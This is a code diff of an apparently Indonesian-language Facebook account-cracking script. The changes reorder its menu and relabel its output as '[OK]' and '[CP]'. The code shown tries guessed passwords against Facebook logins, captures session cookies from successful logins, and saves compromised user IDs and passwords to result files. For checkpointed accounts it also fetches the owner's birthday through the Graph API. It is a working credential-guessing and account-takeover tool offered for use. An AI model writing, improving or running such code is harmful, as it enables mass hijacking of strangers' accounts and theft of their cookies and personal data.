@@ -162,12 +162,10 @@ def menu():
     print(" \x1b[1;92m[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Followers")
     print(" \x1b[1;92m[\x1b[1;93m04\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Postingan")
     print(" \x1b[1;92m[\x1b[1;93m05\x1b[1;92m] \x1b[1;93mCrack Random \x1b[1;92mID FB New")
-    print(" \x1b[1;92m[\x1b[1;93m06\x1b[1;92m] \x1b[1;93mCrack Dari \x1b[1;92mPencarian Nama \x1b[1;93m{\x1b[1;91mBETA\x1b[1;93m}")
-    print(" \x1b[1;92m[\x1b[1;93m07\x1b[1;92m] \x1b[1;93mSettings \x1b[1;92mUser Agent \x1b[1;94mU\x1b[1;97m/\x1b[1;95mA")
-    print(" \x1b[1;92m[\x1b[1;93m08\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mOpsi CheckPoint \x1b[1;93m{\x1b[1;91mBETA\x1b[1;93m}")
-    print(" \x1b[1;92m[\x1b[1;93m09\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mHasil Crack")
-    print(" \x1b[1;92m[\x1b[1;93m10\x1b[1;92m] \x1b[1;93mLaporkan \x1b[1;92mBug Script")
-    print(" \x1b[1;92m[\x1b[1;93m11\x1b[1;92m] \x1b[1;93mInfo \x1b[1;92mTools/Script")
+    print(" \x1b[1;92m[\x1b[1;93m06\x1b[1;92m] \x1b[1;93mSettings \x1b[1;92mUser Agent \x1b[1;94mU\x1b[1;97m/\x1b[1;95mA")
+    print(" \x1b[1;92m[\x1b[1;93m07\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mHasil Crack")
+    print(" \x1b[1;92m[\x1b[1;93m08\x1b[1;92m] \x1b[1;93mLaporkan \x1b[1;92mBug Script")
+    print(" \x1b[1;92m[\x1b[1;93m09\x1b[1;92m] \x1b[1;93mInfo \x1b[1;92mTools/Script")
     print(" \x1b[1;92m[%s\x1b[1;93m00%s\x1b[1;92m]\x1b[1;92m \x1b[1;91mHapus Token"%(M,N))
     asw = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih : \x1b[1;92m")
     if asw == "":
@@ -188,16 +186,12 @@ def menu():
     	fbbaru()
         atursandi()
     elif asw == "6":
-         igg()
-    elif asw == "7":
     	seting_yntkts()
-    elif asw == "8":
-        buatngecek()
-    elif asw == "9":
+    elif asw == "7":
 	cekhasil()
-    elif asw == "10":
+    elif asw == "8":
  	laporbug()
-    elif asw == "11":
+    elif asw == "9":
         info_tools()
     elif asw == "0":
     	os.system('rm -f token.txt')
@@ -601,18 +595,18 @@ def api(uid, pwx):
 				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 				month, day, year = ttl.split("/")
 				month = bulan[month]
-				print("\r  %s* --> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
+				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 				break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r  %s* --> %s|%s         "%(K,uid, pw))
+			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
 			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
 			break
 		else:
 			continue
@@ -653,9 +647,9 @@ def mfbasic(uid, pwx,url,**data):
 		po=s.post(log_in,data=data)
 		if "c_user" in s.cookies.get_dict().keys():
 			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
-			print("\r  %s* --> %s|%s|%s"%(H,uid, pw, kukis))
+			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, kukis))
 			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
 			break
 		elif "checkpoint" in s.cookies.get_dict().keys():
 			try:
@@ -663,18 +657,18 @@ def mfbasic(uid, pwx,url,**data):
 				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 				month, day, year = ttl.split("/")
 				month = bulan[month]
-				print("\r  %s* --> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
+				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 				break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r  %s* --> %s|%s         "%(K,uid, pw))
+			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
 			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
 			break
 		else:
 			continue
